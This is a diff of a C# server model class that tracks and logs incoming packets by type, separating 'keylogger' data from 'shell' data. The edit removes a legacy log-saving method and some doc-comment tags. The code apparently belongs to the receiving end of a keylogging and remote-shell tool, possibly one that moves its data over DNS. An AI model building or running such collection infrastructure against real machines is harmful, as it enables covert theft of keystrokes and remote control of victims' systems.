@@ -64,9 +64,9 @@ namespace Server.Models
             LastReceivedPacket = packetNumber;
         }
         
-        /// <summary>
+
         /// Add data with separate packet tracking by type (keylogger vs shell)
-        /// </summary>
+
         public void AddDataByType(int packetNumber, byte[] data, LogType logType)
         {
             int lastReceived = logType == LogType.Keylogger ? _lastReceivedKeylogPacket : _lastReceivedShellPacket;
@@ -100,19 +100,9 @@ namespace Server.Models
         {
             return Encoding.ASCII.GetString(_data.ToArray());
         }
-        
-        public void SaveToFile(string logPath, int connectionId)
-        {
-            // Legacy method - kept for compatibility
-            Directory.CreateDirectory(logPath);
-            string filename = Path.Combine(logPath, 
-                $"client_{connectionId}_{ClientIP}_{DateTimeOffset.Now.ToUnixTimeSeconds()}.log");
-            File.WriteAllText(filename, GetAllData(), Encoding.ASCII);
-        }
 
-        /// <summary>
+
         /// Save data immediately to type-specific log file
-        /// </summary>
         public void SaveDataByType(string data, LogType logType)
         {
             if (string.IsNullOrEmpty(_clientLogPath)) return;
@@ -161,9 +151,7 @@ namespace Server.Models
             }
         }
         
-        /// <summary>
         /// Flush any remaining buffered data (call on shutdown)
-        /// </summary>
         public void FlushLogs()
         {
             if (_keylogBuffer.Length > 0)
@@ -189,5 +177,4 @@ namespace Server.Models
     }
 
     public class DuplicatePacketException : Exception { }
-    // PacketsOutOfOrderException defined in DNSProtocol.cs to avoid duplication
 }
